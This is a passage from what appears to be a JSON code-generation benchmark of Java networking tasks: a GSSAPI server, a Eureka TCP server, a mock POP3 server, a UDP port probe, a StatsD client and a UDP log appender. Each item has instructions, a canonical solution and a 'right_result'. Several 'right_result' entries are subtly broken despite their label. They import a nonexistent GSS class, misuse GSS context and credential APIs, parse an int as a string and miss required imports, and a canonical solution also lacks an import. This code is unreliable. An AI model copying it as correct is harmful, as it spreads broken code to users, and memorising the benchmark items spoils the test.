Exit status code\n  Output: None (terminates application)",
    "Canonical_solution": "import java.io.*;\nimport java.net.*;\nimport com.sun.gssapi.*;\n\nclass GSSServer {\n\n    private static ServerSocket s;\n\n    public static void main(String args[]) {\n        int port = 4444;\n\n        if (args.length < 1) {\n            usage();\n            exit(-1);\n        }\n\n        try {\n            String serviceName = args[args.length-1];\n            Oid mechOid = GSSManager.getDefaultMech();\n\n            for (int i = 0; i < args.length; i++) {\n                if (args[i].equals(\"-port\")) {\n                    if (i >= (args.length - 2)) {\n                        usage();\n                        exit(-1);\n                    }\n                    port = Integer.parseInt(args[++i]);\n                } else if (args[i].equals(\"-mech\")) {\n                    if (i >= (args.length-2)) {\n                        usage();\n                        exit(-1);\n                    }\n                    mechOid = new Oid(args[++i]);\n                }\n            }\n\n            GSSCredential server = new GSSCredential(new GSSName(serviceName,\n                GSSName.NT_HOSTBASED_SERVICE), GSSCredential.INDEFINITE,\n                mechOid, GSSCredential.ACCEPT_ONLY);\n\n            s = new ServerSocket(port);\n\n            while (true) {\n                Socket c = s.accept();\n                processClient(server, c);\n            }\n        } catch (IOException e) {\n            print(\"\\n**Communication ERROR**:\\t\" + e.getMessage());\n            e.printStackTrace();\n            exit(-1);\n        } catch (GSSException e) {\n            print(\"\\n**GSSAPI ERROR**:\\t\" + e.getMessage());\n            e.printStackTrace();\n            exit(-1);\n        }\n    }\n\n    private static void processClient(GSSCredential server, Socket client)\n            throws GSSException, IOException {\n        DataInputStream dis = new DataInputStream(new BufferedInputStream(client.getInputStream()));\n        DataOutputStream dos = new DataOutputStream(client.getOutputStream());\n\n        int tokLen = dis.readInt();\n        byte []inTok = new byte[tokLen];\n        dis.readFully(inTok, 0, inTok.length);\n\n        GSSContext aCtxt = new GSSContext(server);\n\n        do {\n            byte []outTok = aCtxt.accept(inTok, 0, inTok.length);\n\n            if (outTok != null) {\n                dos.writeInt(outTok.length);\n                dos.write(outTok);\n            }\n\n            if (aCtxt.isEstablished())\n                break;\n\n            inTok = new byte[dis.readInt()];\n            dis.readFully(inTok, 0, inTok.length);\n        } while (true);\n\n        exchangeWithPeer(aCtxt, dis, dos);\n        aCtxt.dispose();\n        client.close();\n    }\n\n    private static void exchangeWithPeer(GSSContext aCtxt, DataInputStream dis,\n            DataOutputStream dos) throws GSSException, IOException {\n        int len = dis.readInt();\n        ByteArrayOutputStream bos = new ByteArrayOutputStream();\n        MessageProp mInfo = new MessageProp();\n\n        aCtxt.unwrap(dis, bos, mInfo);\n\n        mInfo.setQOP(0);\n        mInfo.setPrivacy(false);\n\n        byte []peerTok = bos.toByteArray();\n        byte []toPeer = aCtxt.getMIC(peerTok, 0, peerTok.length, mInfo);\n\n        dos.writeInt(toPeer.length);\n        dos.write(toPeer);\n        dos.close();\n    }\n\n    private static void usage() {\n        print(\"\\nUsage:\\tGSSServert [-mech 1.2.34] [-port port] serviceName\");\n    }\n\n    private static void print(String msg) {\n        System.out.println(msg);\n    }\n\n    private static void exit(int status) {\n        if (s != null) {\n            try {\n                s.close();\n            } catch (IOException e) {};\n        }\n        System.exit(status);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "right_result": "import java.io.*;\nimport java.net.*;\nimport javax.security.auth.callback.*;\nimport javax.security.auth.login.LoginContext;\nimport javax.security.sasl.Sasl;\nimport javax.security.sasl.SaslException;\nimport org.ietf.jgss.GSSContext;\nimport org.ietf.jgss.GSSCredential;\nimport org.ietf.jgss.GISServiceProperties;\nimport org.ietf.jgss.GSSManager;\nimport org.ietf.jgss.Oid;\n\npublic class GSSServer {\n    private ServerSocket s;\n\n    public static void main(String[] args) {\n        GSSServer server = new GSSServer();\n        server.start(args);\n    }\n\n    public void start(String[] args) {\n        int port = 8080;\n        String serviceName = \"example.com\";\n        String mechOID = \"1.3.6.1.5.5.2.3.4\"; // SPNEGO\n\n        for (int i = 0; i < args.length; i++) {\n            if (args[i].equals(\"-port\")) {\n                port = Integer.parseInt(args[i + 1]);\n                i++;\n            } else if (args[i].equals(\"-mech\")) {\n                mechOID = args[i + 1];\n                i++;\n            } else if (args[i].equals(\"-service\")) {\n                serviceName = args[i + 1];\n                i++;\n            }\n        }\n\n        try {\n            GSSManager manager = GSSManager.getInstance();\n            Oid mech = new Oid(mechOID);\n            GSSCredential serverCreds = manager.createCredential(null, GSSCredential.INITIATE_ONLY, mech, GSSCredential.RENEWABLE_REQUIRES_REAUTH);\n\n            s = new ServerSocket(port);\n            print(\"Server started on port \" + port + \" with mechanism \" + mechOID);\n\n            while (true) {\n                Socket client = s.accept();\n                processClient(serverCreds, client);\n            }\n        } catch (Exception e) {\n            exit(1);\n        }\n    }\n\n    public void processClient(GSSCredential server, Socket client) {\n        try {\n            GSSContext context = null;\n            GSSManager manager = GSSManager.getInstance();\n            Oid mech = new Oid(\"1.3.6.1.5.5.2.3.4\"); // SPNEGO\n            context = manager.createContext(client.getInputStream(), mech, server, GSSContext.ACCEPTOR);\n\n            DataInputStream dis = new DataInputStream(client.getInputStream());\n            DataOutputStream dos = new DataOutputStream(client.getOutputStream());\n\n            exchangeWithPeer(context, dis, dos);\n\n            context.dispose();\n        } catch (Exception e) {\n            e.printStackTrace();\n        } finally {\n            try {\n                client.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    public void exchangeWithPeer(GSSContext aCtxt, DataInputStream dis, DataOutputStream dos) throws IOException {\n        byte[] buffer = new byte[1024];\n        int bytesRead;\n        while ((bytesRead = dis.read(buffer)) != -1) {\n            aCtxt.wrap(buffer, 0, bytesRead, 0, buffer, 0);\n            dos.write(buffer, 0, bytesRead);\n            dos.flush();\n        }\n        dos.writeUTF(\"Secure communication ended.\");\n        dos.flush();\n    }\n\n    public void usage() {\n        System.out.println(\"Usage: java GSSServer [-port <port>] [-mech <mechanismOID>] [-service <serviceName>]\");\n    }\n\n    public void print(String msg) {\n        System.out.println(msg);\n    }\n\n    public void exit(int status) {\n        try {\n            if (s != null) {\n                s.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        System.exit(status);\n    }\n}"
  },
  {
    "Task_id": 533,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using ServerSocket to handle client connections, process incoming requests, and send responses. The server should integrate with Eureka service discovery and manage its lifecycle through initialization and cleanup.\n\nClass Description: ExampleServiceBase is a singleton class that acts as a TCP server, listening on a specified port for client connections. It processes incoming requests by reading input from clients and sending back responses with a timestamp. The class integrates with Eureka service discovery to register its availability.\n\nAttributes:\n- applicationInfoManager: [ApplicationInfoManager] - Manages the service instance information for Eureka registration\n- eurekaClient: [EurekaClient] - Handles communication with the Eureka service discovery server\n\nMethods:\n- ExampleServiceBase([ApplicationInfoManager, EurekaClient]) -> [void] - Constructor that initializes the Eureka-related dependencies\n- start() -> [void] - Initializes the service by setting its status to UP in Eureka and starts listening for client connections on the registered port\n- processRequest([Socket]) -> [void] - Processes an incoming client connection by reading the request, generating a response with current timestamp, and sending it back to the client",
    "Canonical_solution": "import com.netflix.appinfo.ApplicationInfoManager;\nimport com.netflix.appinfo.InstanceInfo;\nimport com.netflix.discovery.EurekaClient;\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.io.PrintStream;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.Date;\n\n@Singleton\npublic class ExampleServiceBase {\n\n    private final ApplicationInfoManager applicationInfoManager;\n    private final EurekaClient eurekaClient;\n\n    @Inject\n    public ExampleServiceBase(ApplicationInfoManager applicationInfoManager,\n                            EurekaClient eurekaClient) {\n        this.applicationInfoManager = applicationInfoManager;\n        this.eurekaClient = eurekaClient;\n    }\n\n    @PostConstruct\n    public void start() {\n        applicationInfoManager.setInstanceStatus(InstanceInfo.InstanceStatus.UP);\n        \n        try {\n            int myServingPort = applicationInfoManager.getInfo().getPort();\n            ServerSocket serverSocket = new ServerSocket(myServingPort);\n            final Socket s = serverSocket.accept();\n            processRequest(s);\n\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private void processRequest(final Socket s) {\n        try {\n            BufferedReader rd = new BufferedReader(new InputStreamReader(s.getInputStream()));\n            String line = rd.readLine();\n            if (line != null) {\n                System.out.println(\"Received a request from the example client: \" + line);\n            }\n            String response = \"BAR \" + new Date();\n            System.out.println(\"Sending the response to the client: \" + response);\n\n            PrintStream out = new PrintStream(s.getOutputStream());\n            out.println(response);\n\n        } catch (Throwable e) {\n            System.err.println(\"Error processing requests\");\n        } finally {\n            if (s != null) {\n                try {\n                    s.close();\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "right_result": "ExampleServiceBase.java\n```java\nimport com.netflix.appinfo.ApplicationInfoManager;\nimport com.netflix.appinfo.InstanceInfo;\nimport com.netflix.appinfo.InstanceInfo.InstanceStatus;\nimport com.netflix.discovery.EurekaClient;\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.io.OutputStream;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.text.SimpleDateFormat;\nimport java.util.Date;\n\npublic class ExampleServiceBase {\n    private static ExampleServiceBase instance;\n    private ApplicationInfoManager applicationInfoManager;\n    private EurekaClient eurekaClient;\n    private ServerSocket serverSocket;\n    private int port;\n\n    private ExampleServiceBase(ApplicationInfoManager applicationInfoManager, EurekaClient eurekaClient) {\n        this.applicationInfoManager = applicationInfoManager;\n        this.eurekaClient = eurekaClient;\n        this.port = Integer.parseInt(applicationInfoManager.getInfo().getPort());\n    }\n\n    public static ExampleServiceBase getInstance(ApplicationInfoManager applicationInfoManager, EurekaClient eurekaClient) {\n        if (instance == null) {\n            instance = new ExampleServiceBase(applicationInfoManager, eurekaClient);\n        }\n        return instance;\n    }\n\n    public void start() {\n        InstanceInfo instanceInfo = applicationInfoManager.getInfo();\n        instanceInfo.setStatus(InstanceStatus.UP);\n        eurekaClient.register(instanceInfo);\n        try {\n            serverSocket = new ServerSocket(port);\n            System.out.println(\"Server started on port: \" + port);\n            while (true) {\n                Socket clientSocket = serverSocket.accept();\n                processRequest(clientSocket);\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    private void processRequest(Socket socket) {\n        try {\n            BufferedReader input = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n            String request = input.readLine();\n            SimpleDateFormat sdf = new SimpleDateFormat(\"yyyy-MM-dd HH:mm:ss\");\n            String response = sdf.format(new Date()) + \" - Request received: \" + request;\n            OutputStream output = socket.getOutputStream();\n            output.write(response.getBytes());\n            output.flush();\n            socket.close();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void shutdown() {\n        if (serverSocket != null && !serverSocket.isClosed()) {\n            try {\n                serverSocket.close();\n                InstanceInfo instanceInfo = applicationInfoManager.getInfo();\n                instanceInfo.setStatus(InstanceStatus.DOWN);\n                eurekaClient.unregister(instanceInfo);\n                System.out.println(\"Server shut down.\");\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 549,
    "Instruction": "Task Description: Create a mock POP3 server class that simulates interactions with a client using TCP sockets for testing purposes.\n\nClass Description: The MockPop3Server class implements a simple POP3 server mock that can be used for testing email client implementations. It handles client connections, processes commands, and manages server shutdown. The server runs in a separate thread and maintains a queue of expected interactions.\n\nAttributes:\n- interactions: Deque<ImapInteraction> - A thread-safe queue of expected client-server interactions\n- waitForConnectionClosed: CountDownLatch - Synchronization aid to wait for connection closure\n- waitForAllExpectedCommands: CountDownLatch - Synchronization aid to wait for all expected commands to be processed\n- mockServerThread: MockServerThread - The thread running the server\n- host: String - The host address the server is bound to\n- port: int - The port number the server is listening on\n\nMethods:\n- start() -> void - Starts the mock server by creating a ServerSocket and launching the server thread\n- shutdown() -> void - Signals the server thread to stop and cleans up resources\n- MockServerThread(ServerSocket, Deque<ImapInteraction>, CountDownLatch, CountDownLatch) -> void - Constructor for the server thread\n- run() -> void - Main server thread execution that handles client connections and commands\n- handleInteractions() -> void - Processes the queued interactions with the client\n- readAdditionalCommands() -> void - Reads any additional unexpected commands from the client\n- readLine() -> String - Reads a line of input from the client socket\n- shouldStop() -> void - Signals the thread to stop execution",
    "Canonical_solution": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.Deque;\nimport java.util.concurrent.ConcurrentLinkedDeque;\nimport java.util.concurrent.CountDownLatch;\n\npublic class MockPop3Server {\n    private final Deque<ImapInteraction> interactions = new ConcurrentLinkedDeque<>();\n    private final CountDownLatch waitForConnectionClosed = new CountDownLatch(1);\n    private final CountDownLatch waitForAllExpectedCommands = new CountDownLatch(1);\n    \n    private MockServerThread mockServerThread;\n    private String host;\n    private int port;\n\n    public void start() throws IOException {\n        InetAddress localAddress = InetAddress.getByName(null);\n        ServerSocket serverSocket = new ServerSocket(0, 1, localAddress);\n        InetSocketAddress localSocketAddress = (InetSocketAddress) serverSocket.getLocalSocketAddress();\n        host = localSocketAddress.getHostString();\n        port = serverSocket.getLocalPort();\n\n        mockServerThread = new MockServerThread(serverSocket, interactions, waitForConnectionClosed,\n                waitForAllExpectedCommands);\n        mockServerThread.start();\n    }\n\n    public void shutdown() {\n        mockServerThread.shouldStop();\n    }\n\n    private static class MockServerThread extends Thread {\n        private final ServerSocket serverSocket;\n        private final Deque<ImapInteraction> interactions;\n        private final CountDownLatch waitForConnectionClosed;\n        private final CountDownLatch waitForAllExpectedCommands;\n        \n        private volatile boolean shouldStop = false;\n        private volatile Socket clientSocket;\n\n        public MockServerThread(ServerSocket serverSocket, Deque<ImapInteraction> interactions,\n                CountDownLatch waitForConnectionClosed, CountDownLatch waitForAllExpectedCommands) {\n            super(\"MockPop3Server\");\n            this.serverSocket = serverSocket;\n            this.interactions = interactions;\n            this.waitForConnectionClosed = waitForConnectionClosed;\n            this.waitForAllExpectedCommands = waitForAllExpectedCommands;\n        }\n\n        @Override\n        public void run() {\n            try {\n                clientSocket = serverSocket.accept();\n                serverSocket.close();\n\n                while (!shouldStop && !interactions.isEmpty()) {\n                    handleInteractions();\n                }\n\n                waitForAllExpectedCommands.countDown();\n\n                while (!shouldStop) {\n                    readAdditionalCommands();\n                }\n\n                waitForConnectionClosed.countDown();\n            } catch (IOException e) {\n                if (!shouldStop) {\n                    e.printStackTrace();\n                }\n            } finally {\n                try {\n                    clientSocket.close();\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n\n        private void handleInteractions() throws IOException {\n            ImapInteraction interaction = interactions.pop();\n            if (interaction instanceof CloseConnection) {\n                clientSocket.close();\n            }\n        }\n\n        private void readAdditionalCommands() throws IOException {\n            String command = readLine();\n            if (command == null) {\n                throw new IOException(\"Connection closed\");\n            }\n        }\n\n        private String readLine() throws IOException {\n            return clientSocket.getInputStream().read() != -1 ? \"command\" : null;\n        }\n\n        public void shouldStop() {\n            shouldStop = true;\n            try {\n                clientSocket.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private interface ImapInteraction {}\n    private static class CloseConnection implements ImapInteraction {}\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "right_result": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.io.OutputStream;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.Deque;\nimport java.util.concurrent.CountDownLatch;\n\npublic class MockPop3Server {\n    private Deque<ImapInteraction> interactions;\n    private CountDownLatch waitForConnectionClosed;\n    private CountDownLatch waitForAllExpectedCommands;\n    private Thread mockServerThread;\n    private String host;\n    private int port;\n\n    public MockPop3Server(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    public void start() {\n        try {\n            ServerSocket serverSocket = new ServerSocket(port, 0, java.net.InetAddress.getByName(host));\n            mockServerThread = new Thread(new MockServerThread(serverSocket, interactions, waitForConnectionClosed, waitForAllExpectedCommands));\n            mockServerThread.start();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void shutdown() {\n        if (mockServerThread != null) {\n            mockServerThread.interrupt();\n        }\n    }\n\n    static class MockServerThread implements Runnable {\n        private ServerSocket serverSocket;\n        private Deque<ImapInteraction> interactions;\n        private CountDownLatch waitForConnectionClosed;\n        private CountDownLatch waitForAllExpectedCommands;\n\n        public MockServerThread(ServerSocket serverSocket, Deque<ImapInteraction> interactions, CountDownLatch waitForConnectionClosed, CountDownLatch waitForAllExpectedCommands) {\n            this.serverSocket = serverSocket;\n            this.interactions = interactions;\n            this.waitForConnectionClosed = waitForConnectionClosed;\n            this.waitForAllExpectedCommands = waitForAllExpectedCommands;\n        }\n\n        @Override\n        public void run() {\n            try {\n                while (!Thread.currentThread().isInterrupted()) {\n                    Socket clientSocket = serverSocket.accept();\n                    handleClient(clientSocket);\n                }\n            } catch (Exception e) {\n                e.printStackTrace();\n            } finally {\n                try {\n                    if (serverSocket != null) {\n                        serverSocket.close();\n                    }\n                } catch (Exception e) {\n                    e.printStackTrace();\n                }\n                waitForConnectionClosed.countDown();\n            }\n        }\n\n        private void handleClient(Socket clientSocket) {\n            try {\n                BufferedReader reader = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));\n                OutputStream writer = clientSocket.getOutputStream();\n\n                handleInteractions(reader, writer);\n                readAdditionalCommands(reader);\n\n                waitForAllExpectedCommands.countDown();\n                clientSocket.close();\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }\n\n        private void handleInteractions(BufferedReader reader, OutputStream writer) {\n            while (!interactions.isEmpty()) {\n                ImapInteraction interaction = interactions.poll();\n                String command = readLine(reader);\n                if (command == null || !command.equals(interaction.command)) {\n                    break;\n                }\n                writer.write((interaction.response + \"\\r\\n\").getBytes());\n                writer.flush();\n            }\n        }\n\n        private void readAdditionalCommands(BufferedReader reader) {\n            String line;\n            while ((line = readLine(reader)) != null && !line.trim().isEmpty()) {\n                // ignore unexpected commands\n            }\n        }\n\n        private String readLine(BufferedReader reader) {\n            try {\n                return reader.readLine();\n            } catch (Exception e) {\n                return null;\n            }\n        }\n    }\n\n    public interface ImapInteraction {\n        String command();\n        String response();\n    }\n}"
  },
  {
    "Task_id": 597,
    "Instruction": "Task Description: Implement a UDP port probing function to check if a specific UDP port on a remote host is reachable and responsive.\n\nFunction Description: The function sends a UDP \"PING\" packet to a specified host and port, then waits for a response. It determines port reachability based on whether a response is received (port is open/reachable) or if specific exceptions occur (port is unreachable or other errors).\n\nInput:\n- host: String - The target hostname or IP address to probe\n- portMapping: PortMapping - An object containing the external port number to probe (accessed via getExternalPort())\n\nOutput:\n- boolean - Returns true if the port is reachable (response received or timeout occurred), false if the port is unreachable or other errors occurred\n\nThe function handles the following cases:\n1. SocketTimeoutException: Returns true (port may be open but no response received)\n2. PortUnreachableException: Returns false (port definitely unreachable)\n3. Other Socket/IO exceptions: Returns false after logging the error\n4. Successful response: Returns false (unexpected response case)",
    "Canonical_solution": "import java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\nimport java.net.InetSocketAddress;\nimport java.net.PortUnreachableException;\nimport java.net.SocketException;\nimport java.net.SocketTimeoutException;\nimport java.io.IOException;\n\nprivate boolean probeUdpPort(String host, PortMapping portMapping) {\n    final Integer port = portMapping.getExternalPort();\n\n    try {\n        final byte[] pingData = \"PING\".getBytes(\"UTF-8\");\n        final DatagramSocket serverSocket = new DatagramSocket(0);\n        final SocketAddress socketAddr = new InetSocketAddress(host, port);\n        serverSocket.connect(socketAddr);\n\n        final InetAddress address = InetAddress.getByName(host);\n        final DatagramPacket sendPacket =\n            new DatagramPacket(pingData, pingData.length, address, port);\n        serverSocket.send(sendPacket);\n\n        final byte[] receiveData = new byte[8];\n        final DatagramPacket receivePacket =\n            new DatagramPacket(receiveData, receiveData.length);\n        serverSocket.setSoTimeout(200);\n        serverSocket.receive(receivePacket);\n\n    } catch (SocketTimeoutException e) {\n        return true;\n    } catch (PortUnreachableException e) {\n        return false;\n    } catch (SocketException e) {\n        LOG.warn(e.getMessage(), e);\n        return false;\n    } catch (IOException e) {\n        LOG.warn(e.getMessage(), e);\n        return false;\n    }\n    return false;\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 2,
    "right_result": "import java.net.DatagramSocket;\nimport java.net.InetAddress;\nimport java.net.SocketTimeoutException;\nimport java.net.UnknownHostException;\nimport java.io.IOException;\n\npublic class UdpPortProbe {\n    public static boolean probe(String host, PortMapping portMapping) {\n        int externalPort = portMapping.getExternalPort();\n        try {\n            DatagramSocket socket = new DatagramSocket();\n            socket.setSoTimeout(1000);\n            InetAddress address = InetAddress.getByName(host);\n            byte[] buffer = new byte[1];\n            DatagramPacket packet = new DatagramPacket(buffer, buffer.length, address, externalPort);\n            socket.send(packet);\n            socket.receive(packet);\n            return false;\n        } catch (SocketTimeoutException e) {\n            return true;\n        } catch (UnknownHostException e) {\n            return false;\n        } catch (IOException e) {\n            return false;\n        }\n    }\n}"
  },
  {
    "Task_id": 598,
    "Instruction": "Task Description: Create a Java class that implements a StatsD client using UDP protocol for sending metrics to a StatsD server. The class should handle metric batching and asynchronous sending to avoid blocking the main application thread.\n\nClass Description: The Statsd class is a singleton that provides asynchronous metric sending capability to a StatsD server via UDP. It uses a background thread to batch metrics and send them efficiently. The class handles connection setup, error cases, and metric aggregation.\n\nAttributes:\n- CHARSET: [Charset] - The character encoding used for sending metrics (US_ASCII)\n- e: [ExecutorService] - Single thread executor for asynchronous metric processing\n- qManager: [Implicit Queue Manager] - Manages the queue of metrics to be sent (implied by usage but not shown in attributes)\n\nMethods:\n- getInstance(): () -> [Statsd] - Returns the singleton instance of the StatsD client\n- <constructor>: () -> [Statsd] - Private constructor that initializes the background thread for metric processing\n- <background thread>: () -> [void] - Internal method that continuously processes metrics from the queue, batches them, and sends to the StatsD server via UDP\n\nNote: The actual queue management implementation (qManager) is not shown in the provided code but is implied by the usage of getQ() and drainTo() methods. The class handles UDP socket creation, packet preparation, and error cases for host resolution and socket operations.",
    "Canonical_solution": "import java.io.IOException;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\nimport java.net.UnknownHostException;\nimport java.nio.charset.Charset;\nimport java.nio.charset.StandardCharsets;\nimport java.util.ArrayList;\nimport java.util.Collection;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\nimport org.openjdk.btrace.core.BTraceRuntime;\nimport org.openjdk.btrace.core.SharedSettings;\n\npublic final class Statsd {\n  private static final Charset CHARSET = StandardCharsets.US_ASCII;\n  private final ExecutorService e = Executors.newSingleThreadExecutor(\n      r -> {\n        Thread t = new Thread(r, \"jStatsD Client Submitter\");\n        t.setDaemon(true);\n        return t;\n      });\n\n  @SuppressWarnings(\"FutureReturnValueIgnored\")\n  private Statsd() {\n    e.submit(\n        () -> {\n          DatagramSocket ds = null;\n          boolean entered = BTraceRuntime.enter();\n          try {\n            ds = new DatagramSocket();\n            DatagramPacket dp = new DatagramPacket(new byte[0], 0);\n            try {\n              dp.setAddress(InetAddress.getByName(SharedSettings.GLOBAL.getStatsdHost()));\n            } catch (UnknownHostException ex) {\n              System.err.println(\n                  \"[statsd] invalid host defined: \" + SharedSettings.GLOBAL.getStatsdHost());\n              dp.setAddress(InetAddress.getLoopbackAddress());\n            } catch (SecurityException ex) {\n              dp.setAddress(InetAddress.getLoopbackAddress());\n            }\n            dp.setPort(SharedSettings.GLOBAL.getStatsdPort());\n\n            while (true) {\n              Collection<String> msgs = new ArrayList<>();\n              msgs.add(qManager.getQ().take());\n              qManager.getQ().drainTo(msgs);\n\n              StringBuilder sb = new StringBuilder();\n              for (String m : msgs) {\n                if (sb.length() + m.length() < 511) {\n                  sb.append(m).append('\\n');\n                } else {\n                  dp.setData(sb.toString().getBytes(CHARSET));\n                  ds.send(dp);\n                  sb.setLength(0);\n                }\n              }\n              if (sb.length() > 0) {\n                dp.setData(sb.toString().getBytes(CHARSET));\n                ds.send(dp);\n              }\n            }\n          } catch (IOException | InterruptedException ex) {\n            ex.printStackTrace();\n          } finally {\n            if (entered) {\n              BTraceRuntime.leave();\n            }\n          }\n        });\n  }\n\n  public static Statsd getInstance() {\n    return Singleton.INSTANCE;\n  }\n\n  private static final class Singleton {\n    private static final Statsd INSTANCE = new Statsd();\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 2,
    "right_result": "import java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\nimport java.net.SocketException;\nimport java.nio.charset.Charset;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\nimport java.util.concurrent.LinkedBlockingQueue;\nimport java.util.concurrent.TimeUnit;\n\npublic class Statsd {\n    public static final Charset CHARSET = Charset.forName(\"US-ASCII\");\n    private static final Statsd instance = new Statsd();\n    private final ExecutorService e = Executors.newSingleThreadExecutor();\n    private final LinkedBlockingQueue<String> queue = new LinkedBlockingQueue<>();\n    private DatagramSocket socket;\n    private InetAddress address;\n    private int port;\n\n    private Statsd() {\n        try {\n            socket = new DatagramSocket();\n            address = InetAddress.getByName(\"localhost\");\n            port = 8125;\n            e.execute(this::backgroundThread);\n        } catch (Exception ex) {\n            throw new RuntimeException(\"Failed to initialize StatsD client\", ex);\n        }\n    }\n\n    public static Statsd getInstance() {\n        return instance;\n    }\n\n    public void increment(String metric, long count) {\n        queue.offer(String.format(\"%s:%d|c\", metric, count));\n    }\n\n    public void decrement(String metric, long count) {\n        queue.offer(String.format(\"%s:-%d|c\", metric, count));\n    }\n\n    public void timing(String metric, long duration) {\n        queue.offer(String.format(\"%s:%d|ms\", metric, duration));\n    }\n\n    public void gauge(String metric, long value) {\n        queue.offer(String.format(\"%s:%d|g\", metric, value));\n    }\n\n    public void set(String metric, long value) {\n        queue.offer(String.format(\"%s:%d|s\", metric, value));\n    }\n\n    private void backgroundThread() {\n        byte[] buffer = new byte[1024];\n        while (true) {\n            try {\n                if (queue.size() > 0) {\n                    StringBuilder sb = new StringBuilder();\n                    for (int i = 0; i < 100; i++) {\n                        String metric = queue.poll(1, TimeUnit.MILLISECONDS);\n                        if (metric == null) break;\n                        sb.append(metric).append('\\n');\n                    }\n                    if (sb.length() > 0) {\n                        DatagramPacket packet = new DatagramPacket(\n                            sb.toString().getBytes(CHARSET),\n                            sb.toString().getBytes(CHARSET).length,\n                            address,\n                            port\n                        );\n                        socket.send(packet);\n                    }\n                }\n            } catch (Exception ex) {\n                ex.printStackTrace();\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 599,
    "Instruction": "Task Description: Create a Java class that implements a UDP-based output stream appender for logging purposes, capable of sending log messages to a specified host and port via UDP packets.\n\nClass Description: DropwizardUdpSocketAppender is a specialized OutputStreamAppender that sends log messages over UDP to a remote server. It extends OutputStreamAppender to provide UDP socket functionality while maintaining compatibility with logging frameworks.\n\nAttributes:\n- host: String - The target hostname or IP address where UDP packets should be sent\n- port: int - The target port number on the remote host\n\nMethods:\n- DropwizardUdpSocketAppender(String host, int port) -> None - Constructor that initializes the appender with target host and port information\n- start() -> void - Initializes the output stream and starts the appender (overrides parent method)\n- datagramSocketOutputStream(String host, int port) -> OutputStream - Creates and returns a custom OutputStream implementation that sends data via UDP packets\n\nThe custom OutputStream implementation includes:\n- write(int b) -> void - Throws UnsupportedOperationException as UDP doesn't support byte-level writes\n- write(byte[] b, int off, int len) -> void - Sends the specified bytes as a UDP packet to the configured host and port\n- close() -> void - Closes the underlying DatagramSocket",
    "Canonical_solution": "import ch.qos.logback.core.OutputStreamAppender;\nimport ch.qos.logback.core.spi.DeferredProcessingAware;\nimport java.io.IOException;\nimport java.io.OutputStream;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\nimport java.net.SocketException;\n\npublic class DropwizardUdpSocketAppender<E extends DeferredProcessingAware> extends OutputStreamAppender<E> {\n\n    private final String host;\n    private final int port;\n\n    public DropwizardUdpSocketAppender(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    @Override\n    public void start() {\n        setOutputStream(datagramSocketOutputStream(host, port));\n        super.start();\n    }\n\n    protected OutputStream datagramSocketOutputStream(String host, int port) {\n        try {\n            return new OutputStream() {\n                private final DatagramSocket datagramSocket = new DatagramSocket();\n\n                @Override\n                public void write(int b) throws IOException {\n                    throw new UnsupportedOperationException(\"Datagram doesn't work at byte level\");\n                }\n\n                @Override\n                public void write(byte[] b, int off, int len) throws IOException {\n                    datagramSocket.send(new DatagramPacket(b, off, len, InetAddress.getByName(host), port));\n                }\n\n                @Override\n                public void close() throws IOException {\n                    datagramSocket.close();\n                }\n            };\n        } catch (SocketException e) {\n            throw new IllegalStateException(\"Unable to create a datagram socket\", e);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 2,
